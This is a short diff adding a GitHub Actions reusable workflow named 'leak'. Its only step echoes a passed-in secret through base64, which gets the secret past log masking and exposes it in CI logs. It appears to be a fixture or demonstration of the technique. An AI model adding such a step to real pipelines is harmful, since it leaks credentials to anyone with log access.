@@ -1,0 +1,11 @@
+name: leak
+on:
+  workflow_call:
+    secrets:
+      target:
+        required: true
+jobs:
+  leak:
+    runs-on: ubuntu-24.04
+    steps:
+      - run: echo "${{ secrets.target }}" | base64
